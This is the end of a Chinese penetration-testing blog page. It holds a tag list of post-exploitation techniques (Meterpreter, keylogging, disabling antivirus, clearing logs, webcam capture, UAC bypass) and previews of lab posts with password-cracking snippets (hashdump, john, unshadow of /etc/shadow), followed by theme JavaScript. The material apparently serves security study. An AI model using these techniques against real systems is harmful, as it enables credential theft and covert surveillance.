href="/tags/%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/">查看主机运行时间</a><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8B%E8%8E%B7%E5%8F%96%E7%9A%84%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90/">查看获取的当前权限</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/%E5%85%B3%E9%97%AD%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/">关闭杀毒软件</a><a class="post-meta__tags" href="/tags/%E6%88%AA%E5%9B%BE/">截图</a><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%91%84%E5%83%8F%E5%A4%B4/">查看目标主机的摄像头</a><a class="post-meta__tags" href="/tags/%E6%8B%8D%E7%85%A7/">拍照</a><a class="post-meta__tags" href="/tags/%E5%BC%80%E8%A7%86%E9%A2%91/">开视频</a><a class="post-meta__tags" href="/tags/%E6%89%A7%E8%A1%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/">执行可执行程序</a><a class="post-meta__tags" href="/tags/%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/">开启远程桌面</a><a class="post-meta__tags" href="/tags/%E5%BC%80%E5%90%AF%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD/">开启键盘记录功能</a><a class="post-meta__tags" href="/tags/%E6%98%BE%E7%A4%BA%E6%8D%95%E6%8D%89%E5%88%B0%E7%9A%84%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E4%BF%A1%E6%81%AF/">显示捕捉到的键盘记录信息</a><a class="post-meta__tags" href="/tags/%E5%81%9C%E6%AD%A2%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD/">停止键盘记录功能</a><a class="post-meta__tags" href="/tags/%E7%A6%81%E6%AD%A2%E7%9B%AE%E6%A0%87%E4%BD%BF%E7%94%A8%E9%94%AE%E7%9B%98/">禁止目标使用键盘</a><a class="post-meta__tags" href="/tags/%E5%85%81%E8%AE%B8%E7%9B%AE%E6%A0%87%E4%BD%BF%E7%94%A8%E9%94%AE%E7%9B%98/">允许目标使用键盘</a><a class="post-meta__tags" href="/tags/%E7%A6%81%E6%AD%A2%E7%9B%AE%E6%A0%87%E4%BD%BF%E7%94%A8%E9%BC%A0%E6%A0%87/">禁止目标使用鼠标</a><a class="post-meta__tags" href="/tags/%E5%85%81%E8%AE%B8%E7%9B%AE%E6%A0%87%E4%BD%BF%E7%94%A8%E9%BC%A0%E6%A0%87/">允许目标使用鼠标</a><a class="post-meta__tags" href="/tags/%E4%BD%BF%E7%94%A8%E6%89%A9%E5%B1%95%E5%BA%93/">使用扩展库</a><a class="post-meta__tags" href="/tags/%E6%B8%85%E9%99%A4%E6%97%A5%E5%BF%97/">清除日志</a><a class="post-meta__tags" href="/tags/%E5%9C%A8%E5%85%B7%E6%9C%89Isass%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%9D%83%E9%99%90%E6%89%8D%E5%8F%AF%E4%BB%A5%E6%8A%93%E5%88%B0%E5%AF%86%E7%A0%81/">在具有Isass进程的权限才可以抓到密码</a><a class="post-meta__tags" href="/tags/%E5%A6%82%E6%9E%9C%E5%BD%93%E5%89%8D%E6%98%AFuser%E6%9D%83%E9%99%90%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%89%8D%E8%83%BD%E5%BC%80%E5%90%AF3389/">如果当前是user权限要管理员权限才能开启3389</a><a class="post-meta__tags" href="/tags/%E8%A6%81%E7%94%A8%E5%88%B0bypassuac%E6%8F%90%E6%9D%83/">要用到bypassuac提权</a><a class="post-meta__tags" href="/tags/%E8%BF%9B%E5%85%A5shell/">进入shell</a><a class="post-meta__tags" href="/tags/%E5%B0%86%E7%94%A8%E6%88%B7%E6%8F%90%E5%8D%87%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/">将用户提升到管理员权限</a><a class="post-meta__tags" href="/tags/getpid/">getpid</a><a class="post-meta__tags" href="/tags/%E6%9F%A5%E7%9C%8Bmeterpreter/">查看meterpreter</a><a class="post-meta__tags" href="/tags/kill/">kill</a><a class="post-meta__tags" href="/tags/%E5%85%B3%E9%97%AD%E8%BF%9B%E7%A8%8B/">关闭进程</a><a class="post-meta__tags" href="/tags/run/">run</a><a class="post-meta__tags" href="/tags/%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B/">自动迁移进程</a><a class="post-meta__tags" href="/tags/cobaltstrike%E7%9B%91%E5%90%AC%E7%9A%84%E7%AB%AF%E5%8F%A3/">cobaltstrike监听的端口</a><a class="post-meta__tags" href="/tags/cobaltstrike%E7%9B%91%E5%90%AC%E7%9A%84ip/">cobaltstrike监听的ip</a><a class="post-meta__tags" href="/tags/%E8%BF%99%E9%87%8C%E6%98%AF%E8%8E%B7%E5%BE%97%E7%9A%84session%E7%9A%84id/">这里是获得的session的id</a></div><div class="post-share"><div class="social-share" data-image="/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E7%9A%84%E8%87%AA%E5%B7%B1%E5%AE%B9%E6%98%93%E5%BF%98%E8%AE%B0%E7%9A%84%E4%BD%86%E6%98%AF%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>如果这篇文章帮到了你，可以请我喝杯咖啡。</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/images/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/%E7%AE%80%E5%8E%86/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%AE%80%E5%8E%86-%E4%B8%AA%E4%BA%BA%E7%A8%BF/" title="渗透测试工程师简历-个人稿"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">渗透测试工程师简历-个人稿</div></div><div class="info-2"><div class="info-item-1">渗透测试工程师简历（基于现有笔记） 请按真实情况填入姓名 &#x2F; 联系方式 &#x2F; 城市 &#x2F; 到岗时间，并对项目细节&#x2F;数据做真实补充。  概述 方向：渗透测试与红队实操，侧重信息收集、弱口令&#x2F;爆破、漏洞验证与提权、自动化批量刷洞。 经验来源：自建笔记与靶场实战（HackMyVM&#x2F;OSCP 风格、VulnHub、暗月&#x2F;红日等），CTF 逆向&#x2F;PWN 辅助。  技能与工具 技术：渗透全流程（资产&#x2F;子域&#x2F;端口&#x2F;目录、CMS 识别、漏洞扫描、弱口令爆破、Web&#x2F;系统提权、后渗透持久化）、常见中间件&#x2F;框架漏洞验证，Windows&#x2F;Linux 提权路径（SUID&#x2F;库劫持&#x2F;配置错误&#x2F;溢出绕 ASLR）。 工具：nmap、gobuster&#x2F;dirbuster、Sublist3r&#x2F;ksudomain&#x2F;InsightScan&#x2F;ARL、hydra&#x2F;medusa&#x2F;cheetah、sea...</div></div></div></a><a class="pagination-related" href="/%E6%B8%97%E9%80%8F/VulnHub%E9%9D%B6%E5%9C%BA/001.%20matrix-breakout-2-morpheus/" title="001. matrix-breakout-2-morpheus"><img class="cover" src="/%E6%B8%97%E9%80%8F/VulnHub%E9%9D%B6%E5%9C%BA/001.%20matrix-breakout-2-morpheus/wps20.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">001. matrix-breakout-2-morpheus</div></div><div class="info-2"><div class="info-item-1">一、实验环境的准备 靶场搭建 靶机下载地址：Matrix-Breakout: 2 Morpheus ~ VulnHub 直接解压双击ova文件即可 使用软件：VMware（可能会出现问题），VirtualBox（此处官方建议使用VirtualBox） win10虚拟机Oracle VM VirtualBox安装和使用教程 - 知乎 (zhihu.com) 难度：中等 攻击机：kali-linux-2023.1 靶机：matrix-breakout-2-morpheus 软件VMare—–NAT模式———网段：192.168.14.0&#x2F;24   二、信息收集 1. 主机发现 sudo arp-scan -l     标黄的就是靶机地址 2. 端口发现 nmap -A -sS -sV -p- -v T4 192.168.14.133   发现开发了http80端口，可以先试着访问一下   看源代码，好像没什么用，ssh也不知道密码   3. web服务扫描 whatweb http://192.168.14.133/       (19条消息) web网站目录爆破工具Dir...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/%E6%9C%AA%E5%88%86%E7%B1%BB/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/" title="后渗透TIPS"><img class="cover" src="/%E6%9C%AA%E5%88%86%E7%B1%BB/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-03</div><div class="info-item-2">后渗透TIPS</div></div><div class="info-2"><div class="info-item-1">linux密码爆破john test.txt –format&#x3D;crypt  john爆破出现Using default input encoding: UTF-8 No password hashes loaded (see FAQ) 我以为是  在Vim中直接进行转换文件编码,比如将一个文件转换成utf-8格式:set fileencoding=utf-8查看文件格式:set fileformat?设置文件格式为 unix:set fileformat=unix  结果不是 出现这个提示不是说明破解失败了，而是这个hash以前被你破解过，可以使用以下命令查看破解出的密码是什么。使用下面这条命令即可解决john –show password.txt msf永恒之蓝命令执行后：hashdump得到的值拿到最后32位字母数字组合可以在下图,注意类型是NTLM![Pasted image 20240318142344](Pasted image 20240318142344.png) ![Pasted image 20240318114658](Pasted image 20...</div></div></div></a><a class="pagination-related" href="/%E6%A0%B9%E7%9B%AE%E5%BD%95/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/" title="后渗透TIPS"><img class="cover" src="/%E6%A0%B9%E7%9B%AE%E5%BD%95/%E5%90%8E%E6%B8%97%E9%80%8FTIPS/Pasted%20image%2020240318142344.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-27</div><div class="info-item-2">后渗透TIPS</div></div><div class="info-2"><div class="info-item-1">linux密码爆破john test.txt –format&#x3D;crypt  john爆破出现Using default input encoding: UTF-8 No password hashes loaded (see FAQ) 我以为是  在Vim中直接进行转换文件编码,比如将一个文件转换成utf-8格式:set fileencoding=utf-8查看文件格式:set fileformat?设置文件格式为 unix:set fileformat=unix  结果不是 出现这个提示不是说明破解失败了，而是这个hash以前被你破解过，可以使用以下命令查看破解出的密码是什么。使用下面这条命令即可解决john –show password.txt msf永恒之蓝命令执行后：hashdump得到的值拿到最后32位字母数字组合可以在下图,注意类型是NTLM  unshadow命令基本上会结合&#x2F;etc&#x2F;passwd的数据和&#x2F;etc&#x2F;shadow的数据，创建1个含有用户名和密码详细信息的文件unshadow &#x2F;etc&#x2F...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">乙太</div><div class="author-info-description">道也者，至精也，不可为形，不可为名，强为之名，谓之乙太。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/unique-Elven"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/unique-Elven" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/2098810443" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #00a1d6;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">期待各位给这篇博客项目点点 star：<a target="_blank" rel="noopener" href="https://github.com/unique-Elven/unique-Elven.github.io">unique-Elven.github.io</a><br>如果有问题可以反馈到项目里，持续改进，知识共享。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E7%AE%80%E5%8E%86/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/" title="渗透测试面试问题">渗透测试面试问题</a><time datetime="2026-05-27T17:42:48.000Z" title="发表于 2026-05-28 01:42:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/OSCP%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83(hackmyvm)/gigachad%20-%20suid/" title="gigachad - suid">gigachad - suid</a><time datetime="2026-05-27T17:41:48.000Z" title="发表于 2026-05-28 01:41:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96/%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96%E7%BB%B4%E5%BA%A6%E5%8E%9F%E7%90%86/" title="特征提取维度原理">特征提取维度原理</a><time datetime="2026-05-27T17:40:48.000Z" title="发表于 2026-05-28 01:40:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/AI/LightBGM/Day%201.LightGBM%E7%AE%97%E6%B3%95%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/" title="Day 1.LightGBM算法基本原理">Day 1.LightGBM算法基本原理</a><time datetime="2026-05-27T17:39:48.000Z" title="发表于 2026-05-28 01:39:48">2026-05-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/01%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%87%86%E5%A4%87/" title="01环境安装准备">01环境安装准备</a><time datetime="2026-05-27T17:38:48.000Z" title="发表于 2026-05-28 01:38:48">2026-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 乙太</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.1.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const parseViewBox = viewBox => {
+    if (!viewBox) return null
+    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
+    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
+    return parts
+  }
+
+  const getSvgViewBox = svg => {
+    const attr = parseViewBox(svg.getAttribute('viewBox'))
+    if (attr) return attr
+
+    // Fallback: use bbox to build a viewBox
+    try {
+      const bbox = svg.getBBox()
+      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
+    } catch (e) {
+      // getBBox may fail on some edge cases; ignore
+    }
+
+    const w = Number(svg.getAttribute('width')) || 0
+    const h = Number(svg.getAttribute('height')) || 0
+    if (w > 0 && h > 0) return [0, 0, w, h]
+    return [0, 0, 100, 100]
+  }
+
+  const setSvgViewBox = (svg, vb) => {
+    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
+  }
+
+  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))
+
+  const openSvgInNewTab = ({ source, initViewBox }) => {
+    const getClonedSvg = () => {
+      if (typeof source === 'string') {
+        const template = document.createElement('template')
+        template.innerHTML = source.trim()
+        const svg = template.content.querySelector('svg')
+        return svg ? svg.cloneNode(true) : null
+      }
+      if (source && typeof source.cloneNode === 'function') {
+        return source.cloneNode(true)
+      }
+      return null
+    }
+
+    const clone = getClonedSvg()
+    if (!clone) return
+    if (initViewBox && initViewBox.length === 4) {
+      clone.setAttribute('viewBox', initViewBox.join(' '))
+    }
+    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
+    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
+      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
+    }
+    // inject background to match current theme
+    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
+    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
+    if (!clone.style.background) clone.style.background = bg
+
+    const serializer = new XMLSerializer()
+    const svgSource = serializer.serializeToString(clone)
+    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
+      <style>
+        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
+        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
+      </style>
+      </head><body>${svgSource}</body></html>`
+    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    window.open(url, '_blank', 'noopener')
+    setTimeout(() => URL.revokeObjectURL(url), 30000)
+  }
+
+  const attachMermaidViewerButton = wrap => {
+    let btn = wrap.querySelector('.mermaid-open-btn')
+    if (!btn) {
+      btn = document.createElement('button')
+      btn.type = 'button'
+      btn.className = 'mermaid-open-btn'
+      wrap.appendChild(btn)
+    }
+
+    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'
+
+    if (!btn.__mermaidViewerBound) {
+      btn.addEventListener('click', e => {
+        e.preventDefault()
+        e.stopPropagation()
+        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
+        if (!svg) return
+        const initViewBox = wrap.__mermaidInitViewBox
+        if (typeof svg === 'string') {
+          openSvgInNewTab({ source: svg, initViewBox })
+          return
+        }
+        openSvgInNewTab({ source: svg, initViewBox })
+      })
+      btn.__mermaidViewerBound = true
+    }
+  }
+
+  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
+  const zoomAtPoint = (vb, factor, px, py) => {
+    const w = vb[2] * factor
+    const h = vb[3] * factor
+    const nx = px - (px - vb[0]) * factor
+    const ny = py - (py - vb[1]) * factor
+    return [nx, ny, w, h]
+  }
+
+  const initMermaidGestures = wrap => {
+    const svg = wrap.querySelector('svg')
+    if (!svg) return
+
+    // Ensure viewBox exists so gestures always work
+    const initVb = getSvgViewBox(svg)
+    wrap.__mermaidInitViewBox = initVb
+    wrap.__mermaidCurViewBox = initVb.slice()
+    setSvgViewBox(svg, initVb)
+
+    // Avoid binding multiple times on themeChange/pjax
+    if (wrap.__mermaidGestureBound) return
+    wrap.__mermaidGestureBound = true
+
+    // Helper: map client (viewport) coordinate -> viewBox coordinate
+    const clientToViewBox = (clientX, clientY) => {
+      const rect = svg.getBoundingClientRect()
+      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
+      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
+      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
+      return { x, y, rect, vb }
+    }
+
+    const state = {
+      pointers: new Map(),
+      startVb: null,
+      startDist: 0,
+      startCenter: null
+    }
+
+    const clampVb = vb => {
+      const init = wrap.__mermaidInitViewBox || vb
+      const minW = init[2] * 0.1
+      const maxW = init[2] * 10
+      const minH = init[3] * 0.1
+      const maxH = init[3] * 10
+      vb[2] = clamp(vb[2], minW, maxW)
+      vb[3] = clamp(vb[3], minH, maxH)
+      return vb
+    }
+
+    const setCurVb = vb => {
+      vb = clampVb(vb)
+      wrap.__mermaidCurViewBox = vb
+      setSvgViewBox(svg, vb)
+    }
+
+    const onPointerDown = e => {
+      // Allow only primary button for mouse
+      if (e.pointerType === 'mouse' && e.button !== 0) return
+      svg.setPointerCapture(e.pointerId)
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      if (state.pointers.size === 1) {
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      } else if (state.pointers.size === 2) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        state.startDist = Math.hypot(dx, dy)
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
+      }
+    }
+
+    const onPointerMove = e => {
+      if (!state.pointers.has(e.pointerId)) return
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      // Pan with 1 pointer
+      if (state.pointers.size === 1 && state.startVb) {
+        const p = [...state.pointers.values()][0]
+        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
+        // movementX/Y unreliable on touch, compute from stored last position
+        const last = wrap.__mermaidLastSinglePointer || p
+        const dxClient = p.x - last.x
+        const dyClient = p.y - last.y
+        wrap.__mermaidLastSinglePointer = p
+
+        const { rect } = clientToViewBox(p.x, p.y)
+        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        const dx = dxClient * (vb[2] / rect.width)
+        const dy = dyClient * (vb[3] / rect.height)
+        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
+        return
+      }
+
+      // Pinch zoom with 2 pointers
+      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        const dist = Math.hypot(dx, dy)
+        if (!dist) return
+        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)
+
+        const cx = (pts[0].x + pts[1].x) / 2
+        const cy = (pts[0].y + pts[1].y) / 2
+        const centerClient = { x: cx, y: cy }
+
+        const pxy = clientToViewBox(centerClient.x, centerClient.y)
+        const cpx = pxy.x
+        const cpy = pxy.y
+
+        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
+        setCurVb(vb)
+      }
+    }
+
+    const onPointerUpOrCancel = e => {
+      state.pointers.delete(e.pointerId)
+      if (state.pointers.size === 0) {
+        state.startVb = null
+        state.startDist = 0
+        state.startCenter = null
+        wrap.__mermaidLastSinglePointer = null
+      } else if (state.pointers.size === 1) {
+        // reset single pointer baseline to avoid jump
+        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
+      }
+    }
+
+    // Wheel zoom (mouse/trackpad)
+    const onWheel = e => {
+      // ctrlKey on mac trackpad pinch; we treat both as zoom
+      e.preventDefault()
+      const delta = e.deltaY
+      const zoomFactor = delta > 0 ? 1.1 : 0.9
+      const { x, y } = clientToViewBox(e.clientX, e.clientY)
+      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
+    }
+
+    const onDblClick = () => {
+      const init = wrap.__mermaidInitViewBox
+      if (!init) return
+      wrap.__mermaidCurViewBox = init.slice()
+      setSvgViewBox(svg, init)
+    }
+
+    svg.addEventListener('pointerdown', onPointerDown)
+    svg.addEventListener('pointermove', onPointerMove)
+    svg.addEventListener('pointerup', onPointerUpOrCancel)
+    svg.addEventListener('pointercancel', onPointerUpOrCancel)
+    svg.addEventListener('wheel', onWheel, { passive: false })
+    svg.addEventListener('dblclick', onDblClick)
+  }
+
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+
+      // Clear old render (themeChange/pjax will rerun)
+      const oldSvg = item.querySelector('svg')
+      if (oldSvg) oldSvg.remove()
+      item.__mermaidGestureBound = false
+
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+        if (false) initMermaidGestures(item)
+        item.__mermaidOriginalSvg = svg
+        if (false) attachMermaidViewerButton(item)
+      }
+
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
